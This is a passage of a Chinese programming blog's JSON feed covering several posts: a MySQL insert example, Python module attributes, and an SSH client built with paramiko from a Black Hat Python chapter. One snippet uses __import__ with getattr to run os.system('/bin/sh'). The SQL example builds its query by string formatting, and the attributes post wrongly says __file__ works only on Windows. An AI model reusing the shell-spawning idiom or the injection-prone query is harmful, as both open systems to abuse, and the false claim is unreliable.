data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># 使用 cursor () 方法获取操作游标 </span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>cursor <span class=\"token operator\">=</span> db<span class=\"token punctuation\">.</span>cursor<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># SQL 插入语句</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>sql <span class=\"token operator\">=</span> \"INSERT INTO EMPLOYEE<span class=\"token punctuation\">(</span>FIRST_NAME<span class=\"token punctuation\">,</span> \\</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>       LAST_NAME<span class=\"token punctuation\">,</span> AGE<span class=\"token punctuation\">,</span> SEX<span class=\"token punctuation\">,</span> INCOME<span class=\"token punctuation\">)</span> \\</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>       VALUES <span class=\"token punctuation\">(</span><span class=\"token operator\">%</span>s<span class=\"token punctuation\">,</span> <span class=\"token operator\">%</span>s<span class=\"token punctuation\">,</span> <span class=\"token operator\">%</span>s<span class=\"token punctuation\">,</span> <span class=\"token operator\">%</span>s<span class=\"token punctuation\">,</span> <span class=\"token operator\">%</span>s <span class=\"token punctuation\">)</span>\" <span class=\"token operator\">%</span> \\</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>       <span class=\"token punctuation\">(</span><span class=\"token string\">'Mac'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Mohan'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'M'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2000</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>   <span class=\"token comment\"># 执行 sql 语句</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>   cursor<span class=\"token punctuation\">.</span>execute<span class=\"token punctuation\">(</span>sql<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>   <span class=\"token comment\"># 提交到数据库执行</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>   db<span class=\"token punctuation\">.</span>commit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>   <span class=\"token comment\"># 发生错误时回滚</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>   db<span class=\"token punctuation\">.</span>rollback<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\"># 关闭数据库连接</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>db<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": [
                "数据库编程"
            ]
        },
        {
            "id": "https://or0kit.github.io/Programming/Python/python%E6%A8%A1%E5%9D%97%E7%9A%84%E5%86%85%E7%BD%AE%E5%B1%9E%E6%80%A7/",
            "url": "https://or0kit.github.io/Programming/Python/python%E6%A8%A1%E5%9D%97%E7%9A%84%E5%86%85%E7%BD%AE%E5%B1%9E%E6%80%A7/",
            "title": "python模块的内置属性",
            "date_published": "2021-02-05T12:59:31.000Z",
            "content_html": "<h1 id=\"模块的内置属性\"><a class=\"anchor\" href=\"#模块的内置属性\">#</a> 模块的内置属性</h1>\n<p>对于任何一个 python 文件来说，当 python 解释器运行一个 py 文件，会自动将一些内容加载到内置的属性中；一个模块我们可以看做是一个比类更大的对象。</p>\n<h2 id=\"查看内置属性\"><a class=\"anchor\" href=\"#查看内置属性\">#</a> 查看内置属性</h2>\n<p>我们可以通过 dir () 方法获取该模块所有的显式或隐式属性。<br />\n附上 dir () 的介绍：<br />\n<img data-src=\"image001.png\" alt=\"\" /></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># -*- coding:utf-8 -*-</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>doc......</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>var <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Test</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">pass</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">dir</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\">####### 输出结果 #######</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token string\">'Test'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'__annotations__'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'__builtins__'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'__cached__'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'__doc__'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'__file__'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'__loader__'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'__name__'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'__package__'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'__spec__'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'os'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'var'</span><span class=\"token punctuation\">]</span></pre></td></tr></table></figure><div class=\"note warning\">\n<p>这里有些内容不确定：<br />\n《python 网络编程从入门到精通》这本书上写原话是<br />\n <code>可以看到隐式属性有['Test', '__annotations__', '__builtins__', '__cached__', '__doc__', '__file__', '__loader__', '__name__', '__package__', '__spec__', 'os', 'var']</code></p>\n<p>而在网上的<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vY3dwLWJnL3AvOTg1NjMzOS5odG1s\"> https://www.cnblogs.com/cwp-bg/p/9856339.html</span> 博客中这样写的<br />\n <code>可看到隐式的属性有__annotations__,__builtins__,__cached__,__annotations__,__doc__,__file__,__loader__,__name__;</code></p>\n</div>\n<p>我们打印一下每个魔法属性：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>doc......</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>var <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Test</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">pass</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token comment\"># print(dir())</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>__name__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>__annotations__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>__builtins__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>__cached__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>__doc__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>__file__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>__loader__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>__package__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>__spec__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\">######### 输出结果 ###############</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>__main__</pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token operator\">&lt;</span>module <span class=\"token string\">'builtins'</span> <span class=\"token punctuation\">(</span>built<span class=\"token operator\">-</span><span class=\"token keyword\">in</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>doc<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>G<span class=\"token punctuation\">:</span><span class=\"token operator\">/</span>Text_Files<span class=\"token operator\">/</span>py<span class=\"token operator\">/</span><span class=\"token number\">1.</span>py</pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token operator\">&lt;</span>_frozen_importlib_external<span class=\"token punctuation\">.</span>SourceFileLoader <span class=\"token builtin\">object</span> at <span class=\"token number\">0x0000018C7E37F8B0</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token comment\">## 空行是打印时就有的</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token comment\"># 其中__name__、__doc__、__file__、__package__是可以直接使用的，其它的内置属性一般不允许直接使用。</span></pre></td></tr></table></figure><h2 id=\"内置魔法属性\"><a class=\"anchor\" href=\"#内置魔法属性\">#</a> 内置魔法属性</h2>\n<ol>\n<li>\n<p>_<em>name</em>_<br />\n该属性代表当前模块的名字，每个 py 文件默认的属性，如果当前模块是主程序，值为 “<strong>main</strong>”，如果不是主程序，值为模块名。这个属性经常用来区分主程序和作为被导入模块的程序。</p>\n</li>\n<li>\n<p>_<em>builtins</em>_<br />\n该属性代表内置模块 builtins，即所有的内建函数、内置类型、内置异常等；在 python 执行一个 py 文件时，会将内置模块赋值给这个属性；如果不是主程序，那么这个属性是一个 builtins 模块所有方法的字典。</p>\n</li>\n<li>\n<p>_<em>doc</em>_<br />\n模块的说明文档，py 文件初始化时，将文件开始的说明字符串赋值给这个属性。</p>\n</li>\n<li>\n<p>_<em>file</em>_<br />\n该属性代表文件的绝对路径，任何一个模块使用这个属性就可获得本模块的绝对路径；但是该属性只在 windows 环境下可用，在 linux 环境下不可用。</p>\n</li>\n<li>\n<p>_<em>cached</em>_<br />\n缓存文件，如果是主程序，那么该属性为 None，其他模块的该属性指向该模块的 pyc 字节文件，这样在 py 文件不发生修改的情况下可以减少编译的时间，更快地加载上下文环境。</p>\n</li>\n<li>\n<p>_<em>annotations</em>_<br />\n该属性对于模块文件来说，没有开放给用户使用；但对于函数来说，这个方法用来记录参数的类型和返回值。</p>\n</li>\n</ol>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">get_sum</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span>y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">return</span> x <span class=\"token operator\">+</span> y</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>get_sum<span class=\"token punctuation\">.</span>__annotations__<span class=\"token punctuation\">)</span> <span class=\"token comment\">#输出结果 &#123;&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">get_sum</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span><span class=\"token operator\">></span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">return</span> x <span class=\"token operator\">+</span> y</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>get_sum<span class=\"token punctuation\">.</span>__annotations__<span class=\"token punctuation\">)</span> <span class=\"token comment\"># &#123;'y': &lt;class 'int'>, 'return': &lt;class 'int'>&#125;</span></pre></td></tr></table></figure><p>函数的参数和返回值如果在定义的时候指定了类型，那么它们就会以键值对的形式记录到函数的__annotations__属性中，但对于匿名函数来说，这个属性是不存在的。</p>\n<ol start=\"7\">\n<li>\n<p>_<em>loader</em>_<br />\n该属性 py3.3 之前没有，引用了本模块的加载器对象，即该模块的上下文是由这个加载器加载到内存中的。</p>\n</li>\n<li>\n<p>_<em>package</em>_<br />\n该属性是一个文件是否是包的标志，在主程序中该属性的值永远是 None，不要使用它；当一个包被导入到主程序中，该包的__package__属性为包的名字。</p>\n</li>\n</ol>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># test</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token operator\">-</span><span class=\"token operator\">-</span>__init__<span class=\"token punctuation\">.</span>py</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># main.py</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> test</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>test<span class=\"token punctuation\">.</span>__package__<span class=\"token punctuation\">)</span> <span class=\"token comment\"># test</span></pre></td></tr></table></figure><ol start=\"9\">\n<li><em>spec</em><br />\n 该属性记录一个模块的详细信息，是一个 ModuleSpec 对象，</li>\n</ol>\n<h2 id=\"其他魔法属性\"><a class=\"anchor\" href=\"#其他魔法属性\">#</a> 其他魔法属性</h2>\n<ol>\n<li><em>author</em><br />\n 该属性用来定义模块的作者信息，可以是字符串，也可以是列表、字典等数据结构。</li>\n</ol>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 可以在 python 文件中加入</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>__author__ <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">'auth'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'1asy'</span><span class=\"token punctuation\">;</span><span class=\"token string\">'bg'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'https://self-ferry.github.io/'</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># 或</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>__author__ <span class=\"token operator\">=</span> <span class=\"token string\">'1asy'</span></pre></td></tr></table></figure><ol start=\"2\">\n<li><em>all</em><br />\n 该属性不是模块默认的，需要手动定义，它的功能有二：</li>\n</ol>\n<p>记录一个模块有哪些重要的、对外开发的类、方法或变量等，或记录一个包哪些对外开放的模块；</p>\n<p>限制导入，当使用 <code>“from xxx import *”</code>  形式导入时，实际导入的只有__all__属性中的同名的对象而不是所有，但对于 <code>“from xxx import xxx”</code>  指定了具体的名字则 all 属性被忽略。</p>\n<h2 id=\"魔法方法\"><a class=\"anchor\" href=\"#魔法方法\">#</a> 魔法方法</h2>\n<h3 id=\"_import_\"><a class=\"anchor\" href=\"#_import_\">#</a> _<em>import</em>_</h3>\n<p>该魔法方法是 import 触发，即 <code>import os </code> 相当于 <code>os = __import__('os')</code> ，也可以直接使用，主要用于模块延迟加载，或重载模块。</p>\n<p><span class=\"label\">参数：</span><br />\nname: 模块的名字；<br />\nglobal: 包含全局变量的字典，采用默认值 global ()<br />\n local: 包含局部变量的字典，采用默认值 local ()<br />\n fromlist: 被导入的子模块的名称<br />\n level: 指定使用绝对导入还是相对导入，0 表示只执行绝对导入。</p>\n<p><span class=\"label\">实例</span></p>\n<p>这段代码能在 Linux 下调用 shell</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">loader</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    a <span class=\"token operator\">=</span> <span class=\"token builtin\">__import__</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token builtin\">getattr</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    loader<span class=\"token punctuation\">(</span><span class=\"token string\">\"os\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"system\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"/bin/sh\"</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>__import__函数返回的是一个变量，代表一个模块，所有后续方法的调用都要在这个变量的基础上。</p>\n<h1 id=\"reference\"><a class=\"anchor\" href=\"#reference\">#</a> Reference</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vY3dwLWJnL3AvOTg1NjMzOS5odG1s\">https://www.cnblogs.com/cwp-bg/p/9856339.html</span></p>\n",
            "tags": [
                "python内置属性"
            ]
        },
        {
            "id": "https://or0kit.github.io/Programming/Python/BHP%E7%AC%AC%E4%BA%8C%E7%AB%A0%EF%BC%88%E4%B8%89%EF%BC%89-SSH%E4%B8%8ESSH%E9%9A%A7%E9%81%93/",
            "url": "https://or0kit.github.io/Programming/Python/BHP%E7%AC%AC%E4%BA%8C%E7%AB%A0%EF%BC%88%E4%B8%89%EF%BC%89-SSH%E4%B8%8ESSH%E9%9A%A7%E9%81%93/",
            "title": "BHP第二章（三）-SSH与SSH隧道",
            "date_published": "2021-01-27T15:43:48.000Z",
            "content_html": "<h1 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h1>\n<p>通过 python 打造自己的 SSH (Secure Shell)。</p>\n<h1 id=\"通过paramiko使用ssh\"><a class=\"anchor\" href=\"#通过paramiko使用ssh\">#</a> 通过 paramiko 使用 SSH</h1>\n<h2 id=\"例子\"><a class=\"anchor\" href=\"#例子\">#</a> 例子</h2>\n<p>paramiko 是第三方库，要用 pip 安装。 <code>pip install paramiko</code></p>\n<p>在 python 的世界里，可以使用原始套接字和一些加密函数创建自己的 SSH 客户端或者服务端。但 python 中也有现成模块，使用 paramiko 库中的 PyCrypto 能让我们轻松使用 SSH2 协议</p>\n<p>在示例中，我们首先需要引入 <code>paramiko</code>  库，然后使用 <code>SSHClient()</code>  方法实例化对象，然后使用 <code>load_host_key()</code>  方法密钥认证的方式连接服务器，这里让实验可视化使用 <code>connect()</code>  方法以明文密码的方式连接服务器，连接服务器之前可以使用 <code>set_missing_host_key_policy()</code>  设置对于服务器密钥的策略，使用 <code>AutoAddPolicy()</code>  设置策略为自动添加服务器密钥，然后使用 <code>get_transport()</code>  与 <code>open_session()</code>  方法来得到 ssh 加密通道和打开线程，运用 if 语句与 acitve 属性判断线程是否存活，如果存活，使用 <code>exec_command()</code>  来执行我们想要执行的命令，通过 <code>recv()</code>  方法将命令在服务器执行后的结果返回给我们，这里也需要注意编码问题</p>\n<p><span class=\"label\">Code</span></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> paramiko</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">loging_shh</span><span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">,</span> user<span class=\"token punctuation\">,</span> passwd<span class=\"token punctuation\">,</span> command<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    client <span class=\"token operator\">=</span> paramiko<span class=\"token punctuation\">.</span>SSHClient<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token comment\"># client.load_host_keys('/root/.ssh/konw_hosts')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    client<span class=\"token punctuation\">.</span>set_missing_host_key_policy<span class=\"token punctuation\">(</span>paramiko<span class=\"token punctuation\">.</span>AutoAddPolicy<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    client<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">,</span> username<span class=\"token operator\">=</span>user<span class=\"token punctuation\">,</span> password<span class=\"token operator\">=</span>passwd<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    ssh_session <span class=\"token operator\">=</span> client<span class=\"token punctuation\">.</span>get_transport<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>open_session<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">if</span> ssh_session<span class=\"token punctuation\">.</span>active<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        ssh_session<span class=\"token punctuation\">.</span>exec_command<span class=\"token punctuation\">(</span>command<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>ssh_session<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    loging_shh<span class=\"token punctuation\">(</span><span class=\"token string\">'192.168.199.128'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'root'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'root'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'id'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>运行程序后得到了服务器执行命令后的结果<br />\n<img data-src=\"image001.png\" alt=\"\" /></p>\n<h2 id=\"编写返回命令的ssh\"><a class=\"anchor\" href=\"#编写返回命令的ssh\">#</a> 编写返回命令的 SSH</h2>\n<p>通常情况下，可以使用 SSH 客户端连接 SSH 服务器，但 Windows 本身不一定装有 SSH 服务端，所以我们需要反向将命令从 SSH 服务端发送给 SSH 客户端。（即客户端控制服务端）</p>\n<p><span class=\"label\">Code</span></p>\n<pre><code class=\"language-python\">\n\n</code></pre>\n",
            "tags": [
                "SSH隧道",
                "python",
                "SSH"
            ]
        },
        {
            "id": "https://or0kit.github.io/Programming/Python/Python-converts-pictures-into-character-drawings/",
            "url": "https://or0kit.github.io/Programming/Python/Python-converts-pictures-into-character-drawings/",
            "title": "Python converts pictures into character drawings",
            "date_published": "2021-01-12T09:44:20.000Z",
            "content_html": "<h1 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h1>\n<p>看到一个非常有趣的 python 脚本，可以把图片生成对应的字符画。</p>\n<h2 id=\"code\"><a class=\"anchor\" href=\"#code\">#</a> Code</h2>\n<div class=\"note primary\">\n<p><strong>USAGE</strong><br />\npython <span class=\"exturl\" data-url=\"aHR0cDovL3BpYy1zdHIucHk=\">pic-str.py</span> xxx.jpg --width 200 --height 200 -o xxx.txt</p>\n</div>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># coding:utf-8</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> PIL <span class=\"token keyword\">import</span> Image</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> argparse</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># 命令行输入参数处理</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>parser <span class=\"token operator\">=</span> argparse<span class=\"token punctuation\">.</span>ArgumentParser<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>parser<span class=\"token punctuation\">.</span>add_argument<span class=\"token punctuation\">(</span><span class=\"token string\">'file'</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 输入文件</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>parser<span class=\"token punctuation\">.</span>add_argument<span class=\"token punctuation\">(</span><span class=\"token string\">'-o'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'--output'</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 输出文件</span></pre></td></tr><tr><td 